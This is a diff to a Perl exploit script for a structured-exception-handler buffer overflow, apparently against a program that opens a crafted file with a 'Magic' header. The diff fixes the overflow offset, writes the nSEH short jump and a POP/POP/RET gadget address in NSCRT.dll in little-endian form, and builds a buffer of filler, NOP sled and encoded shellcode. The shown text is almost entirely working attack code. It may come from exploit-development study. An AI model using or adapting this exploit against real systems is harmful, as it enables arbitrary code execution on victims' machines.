@@ -1,17 +1,20 @@
 #!/usr/bin/perl
 
-$offset = 16576;
+$offset = 16576 + 180;
 
 # fills from start of buffer to SEH chain entry
 $filler = "A"x$offset;
 
-# fills the pointer to the next SEH record with {NOP; NOP; JMP +4}
+# fills the pointer to the next SEH record with {NOP; NOP; JMP +4} = 0x9090EB04
 # execution returns to the start of these 4 bytes after the POP; POP; RET occurs
-$next_seh_ptr_overwrite = "\x90\x90\xEB\x04";
+# must represent as little endian
+$next_seh_ptr_overwrite = "\x04\xEB\x90\x90";
 
-# a pointer to the POP; POP; RET gadget
+# a pointer to the {POP; POP; RET} gadget
 # this is in the NSCRT.dll file
-$seh_handler_ptr_overwrite = "\x7c\x37\x25\x9f";
+# target address = 0x7c37259f
+# must represent as little endian
+$seh_handler_ptr_overwrite = "\x9f\x25\x37\x7c";
 
 # nops to pad front of shellcode in the case that the shellcode expands during decoding
 $nops = "\x90"x32;
@@ -77,14 +80,14 @@ $shellcode = "\x89\xe2\xdb\xdf\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .
 "\x46\x65\x4d\x6b\x77\x37\x76\x73\x43\x42\x62\x4f\x50\x6a" .
 "\x33\x30\x70\x53\x39\x6f\x79\x45\x41\x41";
 
+# combine all the malicious input components together
+$buffer = $filler . $next_seh_ptr_overwrite . $seh_handler_ptr_overwrite . $nops . $shellcode;
+
 binmode STDOUT;
 
 $| = 1;
 
 $length = "\xFF\xFF";
-
-# combine all the malicious input components together
-$buffer = $filler . $next_seh_ptr_overwrite . $seh_handler_ptr_overwrite . $nops . $shellcode;
 
 my $maki =
 "\x46\x47" .                              # Magic
